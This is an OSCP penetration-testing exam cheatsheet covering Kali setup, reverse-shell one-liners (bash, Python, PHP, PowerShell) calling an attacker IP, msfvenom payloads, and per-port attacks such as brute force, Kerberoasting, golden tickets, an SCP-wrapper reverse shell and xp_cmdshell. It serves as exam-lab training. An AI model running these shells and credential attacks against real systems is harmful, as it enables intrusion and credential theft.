OSCP Cheatsheet

Latest update: July, 2025

  1. Home
  2. OSCP Cheatsheet

1. Tools & Setup

This is a 24-hour hands-on exam over a hybrid network (standalone hosts + Active Directory set). You operate from a Kali jumpbox over VPN, working from external recon to internal pivots. Stage your toolkit, listeners, and reverse-shell payloads before the timer starts; lose 10 minutes hunting a one-liner and that’s a flag you didn’t get.

1.1 Lab & Kali Setup

Bring up Kali, connect to the exam VPN, sanity-check connectivity, and lay out a workspace that’s easy to grep later. Snapshot the VM so you can roll back if anything breaks at hour 18.

# Connect to the exam VPN profile downloaded from OffSec
sudo openvpn ~/Downloads/universal.ovpn

# Confirm tunnel + DNS to the exam range
ip a show tun0
ip route | grep tun0
ping -c 2 <gateway-ip>

# Workspace layout — one folder per host, central notes/loot
mkdir -p ~/oscp/{recon,exploits,loot,notes,reports,ad}
cd ~/oscp

1.3 Reverse Shell Cheatsheet

Start the listener before firing the payload. Pick the shortest one-liner that fits the target OS and what languages are installed.

# Listeners (Kali)
nc -nvlp 4444
rlwrap nc -nvlp 4444             # readline + arrow keys
rlwrap -cAr nc -nvlp 4444        # better tab completion

# Bash (Linux target)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Python (any OS with Python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows target)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()};$c.Close()"

# msfvenom — pre-stage exam payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tap0 LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=tap0 LPORT=4444 -f elf -o rev
msfvenom -p php/reverse_php               LHOST=tap0 LPORT=4444 -f raw -o rev.php
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=tap0 LPORT=4444 -f raw -o rev.jsp

# Upgrade a dumb shell to an interactive TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z, then on Kali:
stty raw -echo; fg
# Resize so vi/less don't break
stty rows 50 columns 200

1.4 Payload Delivery

# HTTP — universal, target wgets/curls the file
python3 -m http.server 80
sudo python3 -m http.server 80   # <1024 needs root

# SMB — Windows targets can copy from \\10.10.14.5\share
impacket-smbserver share . -smb2support
# from Windows:  copy \\10.10.14.5\share\rev.exe .

# FTP (for picky targets)
python3 -m pyftpdlib -w -p 21

# Base64 + paste (when there's no outbound network)
base64 -w0 rev.exe | xclip -selection clipboard
# on target:  $b='<paste>'; [IO.File]::WriteAllBytes('rev.exe',[Convert]::FromBase64String($b))

2. Information Gathering

2.1 Passive Information Gathering

Gather intelligence without touching the target — WHOIS, search-engine dorks, and third-party indexing services.

whois [domain]
whois [domain] -h [server]
site:somesite.com
site:somesite.com -filetype:html
filetype:txt
ext:txt
intitle:"something"
# Reference: https://www.exploit-db.com/google-hacking-database

Additional passive resources: Netcraft, gitrob / gitleaks, Shodan, Security Headers, SSL Labs, crt.sh (https://crt.sh/?q=%25.target.com).

Tool / Source What it gives you Traffic to target? Key command / URL
WHOIS Registrar, NS, registrant contact, creation/expiry dates None whois [domain]
Google dorks Indexed files, login pages, error messages, config leaks None site:target.com filetype:pdf
Shodan Internet-facing services, banners, CVE tags, open ports None (uses Shodan's crawl) hostname:target.com on shodan.io
Netcraft Hosting history, OS/web server, site age None searchdns.netcraft.com
crt.sh All TLS certs issued — reveals subdomains None https://crt.sh/?q=%25.target.com
gitrob / gitleaks Secrets, keys, credentials committed to public repos None (queries GitHub API) gitrob [org]
theHarvester Emails, subdomains, employee names from multiple sources None theHarvester -d target.com -b all
BGP.he.net / RADB ASN, owned IP ranges / CIDR blocks None whois -h whois.radb.net -- '-i origin AS[n]'

2.2 DNS Enumeration

Query DNS records, attempt zone transfers, and brute-force subdomains to map a target domain's infrastructure.

Record Type Purpose Why it matters in recon
A Maps a hostname to an IPv4 address Primary target resolution; reveals server IP addresses for scanning
AAAA Maps a hostname to an IPv6 address IPv6 addresses are often overlooked by perimeter defences; may bypass firewall rules
CNAME Canonical name alias pointing to another hostname Reveals third-party hosting (CDN, SaaS); dangling CNAMEs can enable subdomain takeover
MX Identifies mail server(s) for the domain Reveals mail infrastructure; useful for phishing setup and SMTP enumeration
NS Authoritative nameservers for the zone Must query these directly for zone transfers (AXFR); reveals hosting provider / DNS admin
TXT Arbitrary text; used for SPF, DMARC, DKIM, domain verification SPF/DMARC misconfigurations enable email spoofing; verification tokens reveal cloud services in use
SOA Start of Authority — primary NS, admin email, serial, refresh timers Admin email leaks the IT contact; serial number reveals how recently the zone was updated
PTR Reverse DNS — maps an IP to a hostname Reveals internal naming conventions and hostnames not present in forward DNS
SRV Service location — protocol, host, and port for a service In AD environments reveals KDC (_kerberos), LDAP (_ldap), SIP, and other service locations
AXFR Zone transfer request — full zone replication If allowed, returns every record in the zone; highest-value single DNS request 
host [domain]
host -t txt [domain]
host [subdomain].[domain]
nslookup [domain]
nslookup -type=[record_type] [domain]
nslookup -type=TXT [domain] [dns_server]
nslookup [domain] [dns_server]
nslookup [IP]
dig [domain]
dig +short [domain]
dig [domain] [record_type]
dig [domain] ANY
dig @[dns_server] [domain]
dig -x [IP]
dig axfr [domain] @[dns_server]
dig +trace [domain]
# bash brute-force — loops a wordlist through host
for ip in $(cat list.txt); do host $ip.[domain]; done
dnsenum [domain]
dnsenum --dnsserver [dns_server] [domain]
dnsenum --enum -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt [domain]
dnsrecon -d [domain]
dnsrecon -d [domain] -t axfr
dnsrecon -d [domain] -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt
dnsrecon -d [domain] -n [dns_server]

2.3 Port Scanning

Identify open ports and running services using Netcat, Nmap, and RustScan.

2.3.1 Netcat

nc [options] [host] [port]
nc -u [host] [port]                                       # UDP
nc -l [host] [port]                                       # listen
nc -k -l [host] [port]                                    # persistent listen
nc -nvv -w 1 -z [host] [start_port]-[end_port]           # TCP range scan
nc -nv -u -z -w 1 [host] [start_port]-[end_port]        # UDP range scan
nc -zvu [host] [port]                                     # UDP single port
nc -nvlp [port]                                           # receive reverse shell

2.3.2 Nmap

Reference: Nmap StationX CheatSheet. NSE scripts are in /usr/share/nmap/scripts/.

Scan Type / Flag Command How it works When to use Noise / OPSEC
SYN (stealth) -sS Sends SYN; records SYN-ACK (open) or RST (closed); never completes handshake Default for root; fastest TCP scan; avoids logging on many services Low — no full connection established
TCP Connect -sT Full 3-way handshake via OS connect() syscall Non-root users (no raw socket access); IPv6 scanning Medium — connection appears in service logs
UDP -sU Sends UDP probe; ICMP port-unreachable = closed; no response = open|filtered Always run alongside TCP to catch SNMP/DNS/TFTP/NTP Low — but very slow; use --top-ports 200
Service / Version -sV Sends protocol-specific probes and matches banners to a signatures DB After finding open ports; reveals exact version for CVE lookup Medium — sends multiple probes per port
OS Detection -O Analyses TCP/IP stack fingerprint differences across OS families When OS is unknown; requires at least one open and one closed port Medium — sends extra probes
Aggressive -A Enables -sV -O --traceroute and default NSE scripts together CTF / lab targets; comprehensive but slow and loud High — maximum probe volume
Default scripts -sC Runs NSE scripts in the default category (safe, commonly useful) Pair with -sV for service enumeration in one pass Medium — scripts interact with services
Vuln scripts --script vuln Runs scripts that check for known CVEs and misconfigurations After confirming open ports; targeted quick-win check High — may trigger WAF/IDS alerts
Skip host discovery -Pn Treats all hosts as up; skips ICMP/ARP ping check When firewall blocks ICMP; target appears down but ports are open Low change — adds probe volume for dead hosts
No DNS resolution -n Skips reverse DNS lookups entirely Speed optimisation; prevents DNS queries revealing scan activity Lower — removes DNS lookup noise
Timing template -T[0–5] Controls inter-probe delay; T0=paranoid, T3=default, T4=aggressive, T5=insane T4 for internal labs; T1/T2 for IDS evasion on real targets Scales with template — T5 very loud
All ports -p- Scans all 65535 TCP ports instead of the default top 1000 Full coverage; combine with -T4 --min-rate for speed Medium-High — large packet volume
Output (all formats) -oA [name] Saves results in normal, greppable, and XML formats simultaneously Always use — saves time when re-querying results N/A — output flag only 
# host discovery
nmap -sn [IP_range]
nmap -v -sn [IP_range] -oG [file].txt          # greppable output
grep Up [file].txt | cut -d " " -f 2           # extract live hosts

# port scans
nmap -p- [IP] -oN [name]_ports.txt             # all 65535 TCP ports
nmap -p- -T4 -n -Pn [IP] -oN [name]_ports.txt  # fast all-ports
nmap -p [port] [IP]                            # specific port(s)
nmap --top-ports=20 [IP]                       # top N ports
sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP]   # fast TCP + UDP all-ports

# scan types
sudo nmap -sS [IP]                             # SYN (stealth)
nmap -sT [IP]                                  # TCP connect
sudo nmap -sU -T5 --top-ports 500 [IP]         # UDP

# service / OS detection
nmap -sV [IP]                                  # service / version
nmap -O [IP]                                   # OS detection
nmap --osscan-guess [IP]
nmap -A [IP] -oN [name].txt                    # aggressive: -sV -O -sC --traceroute

# NSE scripts
nmap --script [scriptName] [IP]
nmap --script-help [scriptName]
nmap --script [category] [IP]                  # auth, brute, default, discovery, exploit, vuln
# PowerShell — check a single TCP port
Test-NetConnection -Port [port] [IP]

# PowerShell — scan ports 1-1024
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null

2.3.3 RustScan

RustScan performs rapid port discovery and can hand results straight to Nmap for deeper inspection.

rustscan -a [ip] -p 1-65535
rustscan -a [ip] -p 1-65535 -- -Pn             # pass args to Nmap
rustscan -a [ip] -r 1-1000                     # specific range
rustscan -a [ip] -b 500 -u 5000               # tune for slow networks
rustscan -a [ip] -p 22,80,443                  # specific ports
rustscan -a [ip] -- -oN [name]_rustscan.txt
rustscan -a [ip] -- -sU -p 1-65535            # UDP via Nmap
rustscan -a [ip] -p 1-65535 -- -sV --script vuln
rustscan -a [ip] -p 1-65535 -g -q             # silent mode
rustscan -a [ip] -p 1-65535 --exclude-ports 80,443
rustscan -a [ip] -p 1-65535 -- -O             # OS detection

2.4 21: FTP

Enumerate FTP for anonymous access, file transfer capabilities, and known backdoors before brute-force.

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
ftp -A [IP]         # anonymous login (user: anonymous, pass: anonymous)
ftp -p [IP]         # passive mode
# recursive download
wget -r ftp://[user]:[password]@[IP]/

# search for a file on the target
find / -name [filename_pattern] 2>/dev/null
hydra -l [user] -P [wordlist] [IP] -t 4 ftp

2.5 22: SSH

Enumerate SSH version and algorithms, then attack credentials or exploit key material for access.

nmap -p 22 --script=ssh-hostkey [ip]
nmap -p 22 --script=ssh-auth-methods [ip]
nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt [ip]
nmap -p 22 --script=ssh3-enum-algos [ip]
nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=[user],ssh.privatekey=[key_path] [ip]
hydra -l [user] -P /usr/share/wordlists/rockyou.txt [ip] -t 4 ssh
hydra -L [user_list] -p [password] [ip] -t 4 ssh -s [port]
hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh
# login with private key
chmod 600 [key_file]
ssh [user]@[IP] -i [key_file]

# convert PuTTY key to OpenSSH
puttygen [putty_key] -O private-openssh -o [key_file]

# crack SSH private key passphrase
ssh2john [key_file] > [key_file].hash
john --wordlist=/usr/share/wordlists/rockyou.txt [key_file].hash
# find private keys on disk
find /etc/ssh -name "*.pub"
find /home/[user]/.ssh -name "id_*"
# scp — download / upload
scp [user]@[ip]:/path/to/file /local/dest
scp /local/file [user]@[ip]:/remote/dest
scp -r [user]@[ip]:/remote/dir /local/dest    # recursive
scp -P [port] [user]@[ip]:/path /local/dest
scp -i [key] [user]@[ip]:/path /local/dest
# bypass host key checking
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no [user]@[ip]

# force legacy crypto (for vulnerable targets)
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa [user]@[ip] -t 'bash -i >& /dev/tcp/[attacker_ip]/443 0>&1'
nc -nvlp [port]
# RCE via SCP wrapper
scp -i [key] scp_wrapper.sh [user]@[ip]:/home/[user]/
nc -nlvp [port]
ssh -i [key] [user]@[ip]
#!/bin/bash
# SCP wrapper — intercepts SCP; otherwise triggers reverse shell
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/[attacker_ip]/443 0>&1
    ;;
esac

2.6 23: Telnet

Telnet passes credentials in cleartext; also useful as a manual banner-grabber for any TCP service.

telnet [ip] 23
telnet -l [user] [ip]

2.7 25: SMTP

Enumerate valid users via VRFY/EXPN, then exploit Shellshock if CGI scripts are reachable.

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [ip]
# manual VRFY — 252 = user exists, 550 = unknown
nc -nv [ip] 25
telnet [ip] 25
EHLO ALL
VRFY [user]
smtp-user-enum -M VRFY -U /usr/share/commix/src/txt/usernames.txt -t [ip]
python3 smtp.py [user] [ip]
# Shellshock via CGI reachable through SMTP
nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
python2 shellshock.py [target_ip] [user]@[domain] [attacker_ip] 139 [root]@[domain]
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[2]
s.connect((ip, 25))

banner = s.recv(1024)
print(banner)

user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

s.close()

2.8 53: DNS

When DNS port 53 is exposed, attempt zone transfer first — a successful AXFR returns the entire zone.

nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 [ip]
nmap -p 53 --script "dns-nsid,dns-srv-enum" [ip]
dig axfr [domain] @[dns_server_ip]
dig ANY [domain] @[dns_server_ip]
nslookup
> server [dns_server_ip]
> set type=any
> [domain]
dnsrecon -d [domain] -n [dns_server_ip] -t axfr
dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver [dns_server_ip] [domain]
# reverse lookup sweep
nmap -sL [ip_range] | grep "Nmap scan report"

# DNS cache snooping
dig @[dns_server_ip] -t A +norecurse [domain]
Resolve-DnsName -Name [domain] -Server [dns_server_ip] -DnsOnly

2.9 69: TFTP

TFTP has no authentication; brute-force common filenames to retrieve config files and credentials.

nmap -p 69 --script tftp-enum [ip]
# download / upload
tftp [ip] 69
tftp> get [remote_file] [local_file]
tftp> put [local_file] [remote_file]
tftp> quit

# non-interactive
echo -e "get [remote_file] [local_file]\nquit" | tftp [ip]
echo -e "put [local_file] [remote_file]\nquit" | tftp [ip]
# brute-force filenames
for i in $(cat [file_list.txt]); do tftp [ip] 69 -c get $i; done
#!/bin/bash
# TFTP Enumeration Script
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_ip> <filename>"
    exit 1
fi

TARGET_IP=$1
FILENAME=$2

tftp $TARGET_IP -c get $FILENAME

if [ -f $FILENAME ]; then
    echo "Retrieved $FILENAME from $TARGET_IP"
else
    echo "Failed to retrieve $FILENAME from $TARGET_IP"
fi

2.10 88: Kerberos

Enumerate valid domain accounts and perform AS-REP roasting and Kerberoasting for offline hash cracking.

  • AS-REP roasting requires only a username list — accounts with pre-auth disabled return a crackable hash without credentials.
  • Kerberoasting requires any domain account — request TGS tickets for SPNs; crack offline with hashcat -m 13100.
  • Golden/Silver Ticket attacks persist after password resets unless krbtgt is rotated twice.
nmap -p 88 --script kerberos-enum-users [ip]
nmap -p 88 --script krb5-enum-users,krb5-scan [ip]
kerbrute userenum -d [domain] -p [userlist] [ip]
./kerbrute_linux_amd64 userenum -d [domain] /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# AS-REP roasting
impacket-GetNPUsers -dc-ip [dc_ip] -request -usersfile [userlist] [domain]
# Kerberoasting
impacket-GetUserSPNs -dc-ip [dc_ip] -outputfile [tickets_file] [domain]/[user]:[password]
# crack tickets
hashcat -m 18200 [hash_file] [wordlist]   # AS-REP
hashcat -m 13100 [hash_file] [wordlist]   # TGS / Kerberoast
john --wordlist=[wordlist] [hash_file]
# request TGT / TGS
impacket-GetTGT -dc-ip [dc_ip] -outputfile [tgt_file] [user]@[domain]
python3 GetST.py -dc-ip [dc_ip] [domain]/[user]:[password] -spn [service]/[target]
# Rubeus
rubeus.exe asktgt /user:[user] /rc4:[hash]
rubeus.exe tgtdeleg /user:[user] /rc4:[hash]
rubeus.exe s4u /user:[user] /rc4:[hash] /impersonateuser:[target_user]
# Golden Ticket
impacket-secretsdump -outputfile [dump] [domain]/[user]:[password]@[dc_ip]
ticketer -user [user] -domain [domain] -sid [sid] -krbtgt [krbtgt_hash] -output [ticket]
impacket-psexec -target-ip [ip] -ticket [ticket] [user]

Reference: https://www.tarlogic.com/blog/how-to-attack-kerberos/

2.11 110: POP3

Brute-force POP3 credentials; mailboxes often contain password-reset emails or credentials shared via internal mail.

nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 [ip]
telnet [ip] 110
USER [user]
PASS [password]
LIST
RETR 1
QUIT
hydra -l [user] -P [wordlist] -f [ip] pop3 -V
hydra -S -v -l [user] -P [wordlist] -s 995 -f [ip] pop3 -V   # SSL on port 995

2.12 111: RPC

Querying portmapper reveals NFS and other RPC services — follow up with showmount to list exports.

nmap -sV -p 111 --script=rpcinfo [ip]
rpcinfo -p [ip]
showmount -e [ip]

2.13 135, 593: MSRPC

Enumerate MSRPC endpoints and use rpcclient to extract users, groups, and SIDs via null or authenticated sessions.

nmap -p 135 --script msrpc-enum [ip]
nmap -p 593 --script http-rpc-epmap [ip]
rpcdump.py [ip] -p 135
# null session enumeration
rpcclient -U "" -N [ip]
rpcclient -U "" -N [ip] -c "srvinfo"
rpcclient -U "" -N [ip] -c "enumdomusers"
rpcclient -U "" -N [ip] -c "enumdomgroups"
rpcclient -U "[user]" -W "[domain]" [ip] -c "queryuser [user]"
# rpcclient user / group enumeration (inside rpcclient session)
enumdomusers
queryuser [0xrid]
queryusergroups [0xrid]
lookupnames [user]
queryuseraliases [builtin|domain] [sid]
enumdomgroups
querygroup [0xrid]
querygroupmem [0xrid]
enumalsgroups [builtin|domain]
queryaliasmem builtin|domain [0xrid]
enumdomains
lsaquery
querydominfo
lsaenumsid
lookupsids [sid]
# brute force SID / user / password
nmap --script smb-brute.nse -p 445 [ip]
crackmapexec smb [ip] -u 'admin' -p wordlist_pass.txt
crackmapexec smb [ip] -u wordlist_user.txt -p [password]
impacket-lookupsid [domain]/[user]:[password]@[ip]
# change user password via rpcclient (level 23)
rpcclient -U "" -N [ip] -c "setuserinfo2 [user] 23 '[new_password]'"
rpcclient -N [ip] -U '[user]%[password]' -c "setuserinfo2 [target_user] 23 '[new_password]'"

2.14 139, 445: SMB

Enumerate SMB shares, users, and vulnerabilities, then escalate to remote command execution using PsExec, WMIExec, or SMBExec.

Port(s) Service Key Tools Common Foothold / What to Look For
139, 445 SMB smbclient, smbmap, crackmapexec, enum4linux, psexec.py, wmiexec.py Null/guest session → readable shares, passwords in descriptions, EternalBlue (MS17-010), Pass-the-Hash to exec tools
143, 993 IMAP / IMAPS nmap imap-ntlm-info, openssl s_client, hydra, searchsploit Weak/default credentials, NTLM info leak (internal hostnames), password-reset emails in mailboxes, version-specific exploits
161/UDP SNMP onesixtyone, snmpwalk, snmpbulkwalk, snmp-check, nmap snmp-brute Default community strings (public/private), cleartext credentials in process args, NET-SNMP-EXTEND RCE (read-write community)
389, 636, 3268, 3269 LDAP / LDAPS / Global Catalog ldapsearch, nmap ldap-*, GetNPUsers.py, GetUserSPNs.py, kerbrute Anonymous bind → full directory read, LAPS passwords (ms-MCS-AdmPwd), AS-REP / Kerberoastable accounts, passwords in description fields
1433 MSSQL nmap ms-sql-*, sqsh, crackmapexec mssql, xp_cmdshell SA/empty-password login, xp_cmdshell → OS RCE, linked server abuse, SQL injection to SA escalation
2049 NFS showmount, nmap nfs-*, mount -t nfs no_root_squash → SUID binary drop, UID spoofing to read protected files, SSH authorized_keys write, webshell drop
3003 Aerospike / CGMS nc, CVE-2020-13151 PoC Unauthenticated info commands (config-get, namespaces), CVE-2020-13151 REST API unauthenticated RCE
3306 MySQL mysql, nmap mysql-*, hydra, crackmapexec mysql Remote root login, FILE privilege → webshell via INTO OUTFILE, UDF RCE, read /etc/passwd with LOAD_FILE()
3389 RDP xfreerdp, rdesktop, hydra, crowbar, crackmapexec rdp BlueKeep/DejaBlue on unpatched hosts, credential spray, Pass-the-Hash with Restricted Admin mode, drive mapping for file transfer
5432, 5433 PostgreSQL psql, hydra, crackmapexec postgres, COPY FROM PROGRAM Superuser credentials → COPY FROM PROGRAM OS RCE, pg_execute_server_program role, version-specific CVEs (e.g., 50847.py for 11.3–11.9)
5900 VNC vncviewer, nmap vnc-info, hydra Authentication type 1 (no auth), blank/default password, ~/.vnc/passwd DES decryption, already-logged-in desktop session
5985, 5986 WinRM evil-winrm, crackmapexec winrm, Enter-PSSession Valid creds + Remote Management Users membership → interactive shell, Pass-the-Hash (-H), in-memory PowerShell script loading
6379 Redis redis-cli, nmap redis-info, redis-rogue-server.py Unauthenticated access → file-write RCE (webshell, SSH key, cron), rogue server MODULE LOAD, CONFIG SET dir/dbfilename + SAVE
any/unknown Unknown service nc -nv, curl, nmap -sV --version-intensity 9 Banner version string, hidden HTTP API, protocol fingerprinting via help/auth commands
  • Readable shares (SYSVOL, NETLOGON, IPC$, C$, ADMIN$), null-session access, guest login, writable shares, and version banners hinting at unpatched vulnerabilities.
  • Pass-the-Hash — once you have an NTLM hash (from secretsdump, Responder, etc.) authenticate directly with -hashes :<NTHASH> in Impacket tools without the plaintext password.
  • PsExec writes a service binary (needs ADMIN$); WMIExec runs commands via WMI (no binary drop, semi-interactive); SMBExec creates a temporary service per command.
  • SMB Relay — when SMB signing is not enforced, relay NTLM auth with ntlmrelayx.py; combine with Responder to capture and relay hashes in real time.
  • RID cycling — crackmapexec smb [ip] -u guest -p "" --rid-brute resolves RIDs to usernames for password spraying even with guest access.
  • SYSVOL / GPP passwords — older domains store GPP passwords encrypted with a publicly-known AES key; --gpp-passwords in CrackMapExec decrypts them instantly.

2.15 143, 993: IMAP

Banner-grab and enumerate IMAP capabilities, then brute-force credentials or search for version-specific exploits.

  • The imap-ntlm-info nmap script extracts internal domain name, NetBIOS hostname, and DNS info without authentication.
  • Once logged in: A001 LOGIN user pass, A002 LIST "" "*", A003 SELECT INBOX, A004 FETCH 1:* (FLAGS BODY[HEADER]).
  • Look for password-reset emails, SSH keys, VPN credentials, and onboarding emails with default passwords.
nmap -p 143,993 --script imap-ntlm-info [ip]
openssl s_client -connect [ip]:993
searchsploit imap [version]
python3 check_imap.py [ip] [port]
import imaplib
import sys

def check_imap_capabilities(host, port):
    if port == 993:
        mail = imaplib.IMAP4_SSL(host)
    else:
        mail = imaplib.IMAP4(host)

    print(mail.capabilities())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    check_imap_capabilities(host, port)

2.16 161 (UDP): SNMP

Brute-force community strings then walk the MIB tree to extract system processes, running programs, user accounts, and open ports.

  • SNMPv1/v2c transmit community strings in cleartext; guessing public or private is often sufficient.
  • OID 1.3.6.1.2.1.25.4.2.1.5 (process argv) frequently leaks passwords passed on the command line to scripts or database connections.
  • If NET-SNMP-EXTEND-MIB::nsExtendOutputFull returns data, a read-write community string may allow RCE via configured extension scripts.
  • Use snmpbulkwalk instead of snmpwalk on large MIBs — it issues bulk requests and is significantly faster.
sudo nmap -sU --open -p 161 [target-range] -oG open-snmp.txt
sudo nmap --script snmp-* -sU -p 161 [ip]
sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=[community-file] [ip]
onesixtyone -c [community-file] [ip]
snmpwalk -v [version] -c [community] [ip] .1
snmpwalk -c [community] -v [version] [ip]
snmpbulkwalk -c [community] -v [version] [ip]
snmp-check [ip]
# build community and IP lists, then scan
echo [community1] > community
echo [community2] >> community
for ip in $(seq 1 254); do echo [network].$ip; done > ips
onesixtyone -c community -i ips
# NET-SNMP extension output
snmpwalk -v [version] -c [community] [ip] NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# query a specific OID
snmpwalk -c [community] -v [version] [ip] [oid]

2.17 389, 636, 3268 & 3269: LDAP

Query LDAP for users, computers, groups, and password-related attributes; use search filters to surface cleartext passwords, SPNs, and delegated accounts.

  • Try anonymous bind first — many DCs allow read access to all objects without credentials.
  • Look for LAPS passwords (ms-MCS-AdmPwd), passwords in description fields, AS-REP roastable accounts (userAccountControl flag 4194304), and Kerberoastable accounts (servicePrincipalName=*).
  • Run ldapsearch -x -H ldap://[ip] -s base namingcontexts first to discover the domain DN before broader queries.
  • Query (objectClass=cACertificate) to confirm ADCS; follow up with Certipy to enumerate templates vulnerable to ESC1–ESC8.
nmap -n -sV --script "ldap* and not brute" [ip]
# anonymous bind
ldapsearch -x -H ldap://[ip]
ldapsearch -h [ip] -x -s base
ldapsearch -x -H ldap://[ip] -s base namingcontexts
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]"
ldapsearch -v -x -b "DC=[domain],DC=[tld]" -H "ldap://[ip]" "(objectclass=*)"
ldapsearch -v -x -b "DC=[domain],DC=[tld]" -H "ldap://[ip]" "(objectclass*)" | grep sAMAccountName:
# filter by object class
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]" "(objectclass=user)"
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]" "(objectclass=group)"
# authenticated search
ldapsearch -h [ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]"
ldapsearch -H ldap://[ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]" "[term]"
ldapsearch -H ldap://[ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]" "[term]" [additionalTerm]
# check for Kerberos pre-auth disabled users
kerbrute userenum -d [domain] --dc [dc_ip] [userlist]

2.18 1433: MSSQL

Enumerate MSSQL configuration and credentials, then enable xp_cmdshell for OS command execution and reverse shell delivery.

  • xp_cmdshell spawns a Windows shell and returns output; disabled by default since SQL Server 2005 but re-enabled by any SA-level user.
  • Linked server abuse — execute queries (and xp_cmdshell) in the context of a higher-privileged account on the linked host.
  • Impersonation — SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE' reveals accounts you can impersonate; EXECUTE AS LOGIN='sa' may grant SA-level rights within that session.
  • UNC path injection — EXEC xp_dirtree '\\[attacker_ip]\share' forces an outbound SMB connection; Responder captures the Net-NTLMv2 hash for offline cracking.
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 [ip]
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=[user],mssql.password=[password],mssql.instance-name=[instance] -sV -p 1433 [ip]
crackmapexec mssql -d [domain] -u [user] -p [password] -x "whoami" [ip]
crackmapexec mssql -d [domain] -u [user] -p [password] -x "SELECT name FROM master.dbo.sysdatabases;" [ip]
# login (Linux)
sqsh -S [ip] -U [user] -P [password]

# login (Windows / domain)
sqsh -S [ip] -U [domain]\\[user] -P [password] -D [database]
-- enable xp_cmdshell
EXEC SP_CONFIGURE 'show advanced options', 1;

2.19 2049: NFS

Enumerate NFS exports and mount accessible shares to read or write files on the target.

  • no_root_squash — root on the client maps to root on the server; mount as root from Kali, copy a SUID shell binary, execute on target for instant privilege escalation.
  • UID spoofing — NFS trusts the UID sent by the client; useradd -u [uid] fake then su fake to read protected files on the mount.
  • SSH authorized_keys injection — if a user's home directory is exported and writable, place your public key in .ssh/authorized_keys on the mount point.
  • Webshell — if a web root is exported with write access, place a PHP/ASP webshell directly on the mount point.
  • Run rpcinfo -p [ip] to list all registered RPC programs; NFS also uses mountd, nlockmgr, and statd on high random ports.
nmap -p 2049 -sV --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client,disk,nfs-*" [ip]
showmount -e [ip]
showmount [ip]
mkdir [mount_point]
sudo mount -t nfs -o vers=[version],nolock [ip]:[share] [mount_point]

2.20 3003: CGMS (possible)

